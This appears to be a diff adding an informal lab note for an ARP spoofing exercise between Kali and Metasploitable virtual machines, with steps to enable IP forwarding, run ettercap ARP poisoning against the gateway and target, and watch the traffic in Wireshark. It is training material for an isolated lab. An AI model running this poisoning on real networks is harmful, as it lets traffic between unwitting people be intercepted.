@@ -1,0 +1,35 @@
+
+BEFORE STARTING
+
+Make sure:
+
+ Kali Adapter 1 → Host-OnlyMetasploitable Adapter 1 → Host-Only
+
+ step 1 - On Kali: ip a or -ifconfig -> command
+
+step 2 -  Switch to Metasploitable: ifconfig -> command 
+
+ step 3 - On Kali:  ping (metaplote ip  addrr will come in this ) -> command in metasplote the ip addrr copy in ping then adrr then ctrl +c
+
+step 4 - On Kali: netstat -antpl -> command if not found then ->sudo apt install net-tools -> command
+
+step 5 - on kali: traceroute 192.168.56.102 -> command this metalope ipaddrs if not install :sudo apt install traceroute -> command
+
+step 6 - On Kali: sudo sysctl -w net.ipv4.ip_forward=1 -> command , verify, cat /proc/sys/net/ipv4/ip_forward ->command
+
+step 7 - On Kali: sudo ettercap -T -q -i eth0 -M arp:remote /here the gate way//here ipaddr metasployt//
+
+step 8 - On Metasploitable: arp -n -> command
+
+step 9 -On Kali (new terminal): sudo wireshark -> command
+
+step 10 - Select eth0  -Start capture- In display filter bar type: arp
+
+step 11 - On Metasploitable: ping 192.168.56.101 <-the ping of kali ifconfig addr
+
+
+
+
+
+
+
